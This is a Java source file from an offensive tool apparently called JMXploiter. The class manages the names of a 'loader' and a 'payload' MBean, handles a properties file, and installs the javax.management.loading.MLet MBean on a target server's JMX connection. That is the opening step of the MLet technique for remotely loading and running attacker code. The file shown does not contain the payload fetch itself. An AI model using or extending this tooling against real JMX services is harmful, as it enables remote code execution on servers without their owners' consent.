package jmxManagers;

import runnable.JMXploiter;

import javax.management.MBeanServerConnection;
import javax.management.MalformedObjectNameException;
import javax.management.ObjectName;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Properties;
import java.util.Scanner;

public class JMXMBeanManager {
    private static final String JAVAX_LOADING_MBEAN_MODULE = "javax.management.loading.MLet";

    private static ObjectName loaderMBeanName;
    private static ObjectName payloadMBeanName;

    public static ObjectName getLoaderMBeanName() {
        return loaderMBeanName;
    }

    public static ObjectName getPayloadMBeanName() {
        return payloadMBeanName;
    }

    //Have to initialize this before we generate our index file
    static {
        loadObjectNames();
    }

    public static void installJavaxLoadingMLet(MBeanServerConnection serverConnection) {
        try {
            serverConnection.createMBean(JAVAX_LOADING_MBEAN_MODULE, loaderMBeanName);
            System.out.println("Loading mlet installed in the target");
        } catch (Exception instanceAlreadyExistsException) {
            System.out.println("The instance of " + loaderMBeanName.toString() + " already exists. Do you want to delete it? y/n");
            Scanner in = new Scanner(System.in);
            String response = in.nextLine();
            in.close();

            if (response.equalsIgnoreCase("y")) {
                try {
                    System.out.println("Attempting to delete and recreate...");
                    serverConnection.unregisterMBean(loaderMBeanName);
                    serverConnection.createMBean(JAVAX_LOADING_MBEAN_MODULE, loaderMBeanName);
                    System.out.println("Management Mbean has been added");
                } catch (Exception e) {
                    System.out.println("The management mbean could not be loaded " + e.toString());
                    System.exit(1);
                }
            } else {
                System.out.print("Playing it safe is probably a smart choice. Terminating.");
                System.exit(0);
            }

        }
    }

    /**
     * Handles getting a property from the configuration file
     *
     * @param property the property to fetch a value for
     * @return the value corresponding to the requested property
     */
    public static String getProperty(String property) {
        String propertiesFileName = JMXploiter.getPropertiesFileName();

        try (InputStream input = new FileInputStream(propertiesFileName)) {

            Properties prop = new Properties();

            // load a properties file
            prop.load(input);

            // get the property value and print it out
            return (prop.getProperty(property));

        } catch (NullPointerException nullPropertyError) {
            System.out.println("Property name: " + property + " not found. You may need to modify your properties file");
            System.exit(1);
        } catch (IOException ex) {
            System.out.println("Properties file not found " + ex.toString());
            System.exit(1);
        }

        return null;
    }

    /**
     * Sets a property in the configuration file
     *
     * @param propName  the property to set
     * @param propValue the value to set for the property
     */
    public static void setProperty(String propName, String propValue) {
        String propertiesFileName = JMXploiter.getPropertiesFileName();

        try (InputStream input = new FileInputStream(propertiesFileName)) {
            Properties prop = new Properties();
            prop.load(input);

            prop.setProperty(propName, propValue);

            try (FileOutputStream out = new FileOutputStream(propertiesFileName)) {
                prop.store(out, "Updated dynamic property");
            } catch (Exception e) {
                System.out.println("Couldn't write to the properties file, this may cause errors " + e.toString());
            }
        } catch (IOException e) {
            System.out.println("Could not find the properties file. You may need to generate one or ensure it is on the path " + e.toString());
            System.exit(1);
        }
    }

    public static void loadObjectNames() {
        try {
            loaderMBeanName = new ObjectName(getProperty("loaderMBeanName"));
            payloadMBeanName = new ObjectName(getProperty("payloadMBeanName"));
        } catch (NullPointerException nullPropertyError) {
            System.out.println("Property name not found. Check your config file: " + nullPropertyError.toString());
            System.exit(1);
        } catch (MalformedObjectNameException e) {
            System.out.println("Object name is not valid. Check your config file. Example name: java.util.logging:type=pineapple: " + e.toString());
            System.exit(1);
        }

    }

}
